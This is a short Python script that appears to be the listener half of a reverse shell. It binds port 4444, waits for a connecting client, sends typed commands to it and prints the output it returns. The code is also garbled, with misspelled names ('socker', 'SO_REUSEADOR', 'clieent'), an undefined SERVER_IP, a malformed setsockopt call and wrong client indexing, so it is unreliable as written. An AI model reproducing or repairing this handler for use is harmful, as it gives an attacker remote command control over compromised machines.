import sys
import socket

SERVER = ""
PORT = 4444

#variables
s = socket.socket()
s.setsockopt(socker.SOL_SOCKET,socket.SO_REUSEADOR, )
s.bind((SERVER,PORT))

s.listen(1)

while True:
    print(f'[+] listening as {SERVER_IP}:{PORT}')

    clieent = s.accept()
    print(f'[+] client connected {client(1)}')

    client[0].send('connected'.encode())
    while True:
        cmd = input('>>> ')
        client[0].send(cmd.encode())

        if cmd.lower() in ['quit', 'exit', 'q', 'x']:
            break
        result = client[0].recv(1024).decode()
        print(result)
    client[0].close()

    cmd = input('Wait for new client y/n') or 'y'
    if cmd.lower() in ['n', 'no']:
        break

s.close()
        


